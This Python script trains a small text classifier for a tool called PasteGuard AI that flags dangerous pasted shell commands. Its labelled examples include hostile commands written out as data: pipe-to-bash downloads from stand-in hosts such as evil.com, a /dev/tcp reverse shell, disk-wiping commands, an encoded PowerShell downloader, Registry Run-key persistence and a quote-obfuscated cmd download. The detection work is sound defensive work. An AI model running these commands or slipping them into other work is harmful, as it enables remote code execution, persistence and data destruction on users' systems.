#!/usr/bin/env python3
"""train_model.py – Creates command_classifier.pkl for PasteGuard AI."""

import joblib
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.pipeline import make_pipeline

# 0 = safe, 1 = malicious
data = [
    # Safe commands you copy every day
    ("sudo apt update", 0),
    ("pip install flask", 0),
    ("npm install express", 0),
    ("git clone https://github.com/user/repo.git", 0),
    ("python -m http.server 8000", 0),
    ("ssh user@example.com", 0),
    ("scp file.txt server:/tmp/", 0),
    ("ls -la", 0),
    ("cat /etc/os-release", 0),
    ("echo Hello World", 0),
    ("export PATH=/usr/local/bin:$PATH", 0),

    # Malicious / dangerous commands
    ("curl -s http://evil.com/backdoor.sh | bash", 1),
    ("wget -qO- http://malware.net/payload | sh", 1),
    ("bash -i >& /dev/tcp/10.0.0.1/8080 0>&1", 1),
    ("rm -rf /", 1),
    ("mkfs.ext4 /dev/sda1", 1),
    ("dd if=/dev/zero of=/dev/sda", 1),
    ("powershell -enc SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBlAHYAaQBsAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkACcAKQA=", 1),
    ("cmd /c curl -s http://fake-av-support.com/remote.exe -o %TEMP%\\x.exe && start %TEMP%\\x.exe", 1),
    ("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d C:\\malware.exe", 1),
    ("c\"\"m\"\"d /\"\"c c\"\"u\"\"r\"\"l -s http://evil.xyz/backdoor.sh -o %tmp%\\x.exe & start %tmp%\\x.exe", 1),
    ("powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand ...", 1),
]

texts = [d[0] for d in data]
labels = [d[1] for d in data]

pipe = make_pipeline(
    TfidfVectorizer(analyzer='char_wb', ngram_range=(2, 4), max_features=2000),
    LogisticRegression(max_iter=300)
)
pipe.fit(texts, labels)
joblib.dump(pipe, "command_classifier.pkl")
print("✅ command_classifier.pkl created. Place it next to pasteguard.py.")